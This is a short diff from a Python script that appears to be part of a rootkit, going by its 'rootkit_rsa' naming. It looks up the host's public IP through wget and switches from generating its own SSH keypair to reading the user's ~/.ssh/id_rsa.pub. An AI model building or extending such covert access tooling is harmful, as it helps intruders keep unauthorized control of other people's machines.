@@ -11,11 +11,8 @@ stream = os.popen('wget -qO- http://ipecho.net/plain | xargs echo')
 public_ip = stream.read()
 public_ip = public_ip[:-1]
 
-#generate a new ssh rsa keypair
-os.system("ssh-keygen -t rsa -N '' -f rootkit_rsa")
-
-##get's the users public rsa ssh key
-ssh_key_file = open(os.path.expanduser("rootkit_rsa.pub"), "r")
+#get's the users public rsa ssh key
+ssh_key_file = open(os.path.expanduser("~/.ssh/id_rsa.pub"), "r")
 ssh_key = ssh_key_file.read()
 ssh_key_file.close()
 
